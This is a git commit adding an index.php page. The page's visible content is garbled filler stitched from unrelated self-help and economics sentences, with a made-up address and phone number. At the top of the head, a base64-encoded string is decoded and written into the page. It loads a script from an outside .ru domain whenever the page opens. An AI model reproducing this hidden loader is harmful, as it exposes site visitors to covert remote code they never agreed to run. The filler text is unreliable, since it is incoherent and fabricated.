bffc3f0a761ec925f364f40fc87bc3c034a1c77c
fritdiur <81514074+fritdiur@users.noreply.github.com>
2021-03-28 14:29:20 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl85enRhZXZidWNscnJibHo2N3ciPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>All social transfers can be one-off or paid periodically over a specified time frame.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="yukdq79eoz2rwux">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="nu5wifoo12ejzgx5krlvq">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>All social transfers can be one-off or paid periodically over a specified time frame.</h1>
+	</section>
+
+
+	<section class="our-work" class="d9pnmk62mmoy64rba">
+		<h3 class="title">We are locked in the current situation, we are deep</h3>
+		<p>He thought about what he was striving for in life - about success, about recognition, about security - and found convincing confirmation of all these motives.  The degree of accuracy with which our speculative maps describe a territory does not affect the existence of that territory.  Realizing how powerful the scenarios turned out to be in our own lives, we experienced the strongest desire to do everything in our power so that what we pass on to the new generation - both by example and by instruction - was based only on the right principles.  After we discussed the situation in more detail, I advised him to prepare an effective argumentation using ethos, pathos and logos.  At the same time, it gives you the freedom to subordinate your plans to higher values ​​without dramatization.  We'll talk more about short-term goals when we get to Habit 3.  But our hero behaved proactively towards these people.  The structural element of the ranking is a set of goods and services according to one or another characteristic.  32.  But the main thing is that we have many different ways of thinking at our disposal, and we are not using our potential.  It was Saturday. </p>
+		<hr>
+
+		<ul class="grid" class="3s5fgjckkwfpau1697r0jmbb">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="d9pnmk62mmoy64rba">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>However, before throwing out the egg, he changes his mind and decides to take it to the jeweler to check it out.  I enjoy life.  As you</td>
+    <td>You have a point of view and a system of values ​​that I must understand.  They want everyone to dance to their tune.  Under </td>
+    <td>Synergy works.  If family members cannot agree on what to watch on the video so that everyone is happy, then they may simply decide to do some</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>"From the bottom up" are reports on the execution of orders.  During communication, the husband truly, deeply sympathizes with the wife's desire to vis</td>
+    <td>O., where D is the number of monetary units required in a given period for circulation; P - the sum of the prices of goods to be sold;B– the sum of </td>
+    <td>They decided that subjects would include running, tree climbing, swimming and flying.  Of course, there are situations when a person,</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Based on the extension of liability only to the capital of the enterprise.  Just listen and try to understand.  The teach</td>
+    <td>Pretty.  Anything can change, but these three factors will remain the same.  Farmers may delay the export of corn from the current c</td>
+    <td>All this time that I have been here in Chicago, I have been trying to get one big commercial real estate deal.  They didn't have to fight for oxygen.  Besides addi</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="yukdq79eoz2rwux">
+		<h3 class="title">The IBM staff responsible for organizing t</h3>
+		<p>In turn, consumers can buy anything; - mobility of material, labor, financial resources,since entrepreneurial activity pursues the goal of increasing income, and this can only be counted on when expanding production, mastering new technology, introducing new technologies, etc .; - availability of reliable information on supply, demand, prices, etc., to each market entity.  But if the family is seen as the center of your life, then, paradoxically, it will destroy everything that leads to family happiness.  - What to do now? - after a pause she said.  It is best to start slowly.  The Russian economy is in dire need of investment, so attempts to accelerate amortization are being observed in our country.  You shouldn't take the attack as a personal insult.  Or whether your friends are going to stay overtime too.  Many workers do not fall into the employed category.  Many executives, managers, and parents swing from side to side like a pendulum, from Win / Lose neglect to Lose / Win forgiveness.  And the oligopolist has a certain degree of power over the price.  He tried to understand his hidden concerns and, relying on this understanding, accompanied the traditional reports to the leader with his own analysis of the situation and appropriate recommendations. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="nu5wifoo12ejzgx5krlvq" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="d9pnmk62mmoy64rba">
+		<h3 class="title">Failure to meet sales targets, growing unpaid invoices, and low</h3>
+		<p>Identify one Quadrant II activity that you have neglected in your life and that, if done well, would have a significant positive impact on your life, both personal and professional.Write it down and commit to doing it.  That is why sometimes we look for a shorter route and hope to get the desired result by jumping over a few vital steps and saving time and effort.  This is just one of the possible options for this paradigm, but it is a good illustration of the way of thinking based on it.  See, for example, how a house is built.  The costs associated with production and (or) sale are subdivided into: a) material costs; b) labor costs; c) the amount of accrued depreciation; d) other expenses.  - Did you like it, Stephen? “I liked it,” he replied.  You cannot ignore the urgent and important affairs of Quadrant I, although it will shrink as you spend more time on the precautionary and preparatory actions of Quadrant II.  He gives us the opportunity to declare: “The program that I received from childhood with the help of my social mirror is worthless.  Remember that quick fixes are just a mirage.  You develop your ability to live with imagination and conscience, not just memory.  The change in income elasticity is associated with the concept of nominal and inferior goods.Since in this case income and demand change in the same direction, the income elasticity of demand for nominal goods will be positive.  for both of you.  Perhaps, by channeling these funds to tailoring men's trousers, the company will receive a much greater profit. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="3s5fgjckkwfpau1697r0jmbb" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="3s5fgjckkwfpau1697r0jmbb" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="yukdq79eoz2rwux">
+		<h3 class="title">But in the course of competition, the weak lose the</h3>
+		<p>With increasing income, consumers buy such goods less, preferring higher quality ones.  These are strong threads that are woven into the fabric of life with precision, consistency, beauty and strength.  For the ascent of this spiral to be consistent and meaningful, we must consider another aspect of renewal,which belongs to the unique properties of man and guides this upward movement - our conscience.  External and internal loans at the enterprise directly depend on the economic situation in the country; 3) culture and society.  There is some kind of confusion.  Among other things, the plan was to "quit Carol", that was the name of his girlfriend.  At first, they may not like the open opposition that such integrity sometimes engenders.  Everything took place in one of the hotels.  A character enriched with integrity, maturity and the Sufficiency Mentality acquires an authenticity and naturalness, which are much more important than the possession (or non-possession) of any methods of interaction with people.  We agreed that my daughter would use the car only in case of serious need and that, when necessary, she would serve my mother and me as a driver.  They increasingly feel like victims, unable to control the situation and not responsible for their lives and destiny.  And the more this or that need means to him, the deeper he experiences; 2) needs.  But realizing that we have these various possibilities,we are able to consciously use our intelligence to better meet specific needs.  Every step counts and takes time. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="nu5wifoo12ejzgx5krlvq" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="d9pnmk62mmoy64rba">
+		<h3 class="title">You are not reactive.  They don't even rea</h3>
+		<p>- And yet, - I persisted, - what would you like to do? “You see,” she said after some thought, “you don’t want to do what I want to do.  Communication experts estimate that only 10 percent of information is transmitted through words; 30 percent is conveyed through intonation and 60 percent through facial expressions and sign language.  Empathic listening in itself is a tremendous contribution to the Emotional Banking Account.  The more you first seek to understand (Habit 5), the more effective you will be in finding win / win synergistic solutions (Habits 4 and 6).  But the main thing is that we have many different ways of thinking at our disposal, and we are not using our potential.  Or with a person who studies endlessly, produces nothing and lives at the expense of other people's golden eggs.  Moreover, each firm seeks to obtain the greatest possible profit from its activities.  People who once experienced true synergy will never be the same as they were before.They know the opportunity to relive this exciting adventure that expands horizons.  When we got down to business, we found that the biggest challenge for interns when assigning them to a particular unit was getting a clear idea of ​​the desired results.  Character is the foundation of Win / Win and everything else is built on that foundation.Three character traits are essential for the Win / Win paradigm.  Skill creation requires work in all three directions.  In other words, expectations concentrate on maintaining the P / PC balance.  The bank was going to refuse him the right to redeem a mortgage on the land in consequence of the violation of the terms of payments for the loan.  I would like him to remember me as a loving father who shared with him all the troubles and joys of his childhood, adolescence and youth.I would like him to remember how he came to me with his worries and problems, and I listened to him with all my love and helped him. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="3s5fgjckkwfpau1697r0jmbb" class="title">Here again, relationships are key.  5.  Since Win / Win is a pr</h3>	
+		<p>Depending on the size, firms are divided into large,small and medium.  At the same time, indicators of "weak" students increased.  And by doing this, we can create strong relationships at the same time.  He's never going to get out of the worst quarter.  - What did you like the most? - I do not know.  Neglecting any of the four dimensions creates a negative force field that inhibits development and reduces efficiency.  The impact on demand of changes in monetary income is somewhat more complex.  Or, parents can focus on making sure their children are correct and impeccable at any given moment.  The boundaries of formal and real power do not always coincide. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="yukdq79eoz2rwux">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="nu5wifoo12ejzgx5krlvq"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="d9pnmk62mmoy64rba"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="3s5fgjckkwfpau1697r0jmbb"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>540 Pollich Drives, Apt. 838, 85069-3395, D'Amorestad, Tennessee, United States</p>
+		<p>Phone number: +3(059)050-94680</p>
+	</footer>
+
+</body>
+
+</html>
